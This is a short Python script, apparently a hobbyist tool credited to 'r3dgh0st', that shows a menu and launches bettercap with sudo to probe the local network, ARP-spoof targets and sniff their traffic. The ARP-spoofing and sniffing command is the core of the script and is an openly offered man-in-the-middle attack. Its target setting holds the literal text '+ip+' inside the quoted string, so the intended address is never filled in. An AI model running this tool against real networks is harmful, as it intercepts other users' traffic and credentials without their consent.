#librerias
import os
import time
print("Creador por r3dgh0st")
time.sleep (2)
os.system('clear')
def sniff():
    os.system('sudo bettercap -eval "clear ; net.recon on ; net.probe on; set arp.spoof.targets +ip+  ; set arp.spoof on ; set net.sniff.verbose false ; net.sniff on ;" ')
    
#menu
os.system('figlet Auto-Sniffing')
print("[1] --> Start Sniffing")
print("[2] --> Exit Script")
print("")
opt_menu = input(">>> ")
if opt_menu == "1":
    sniff()
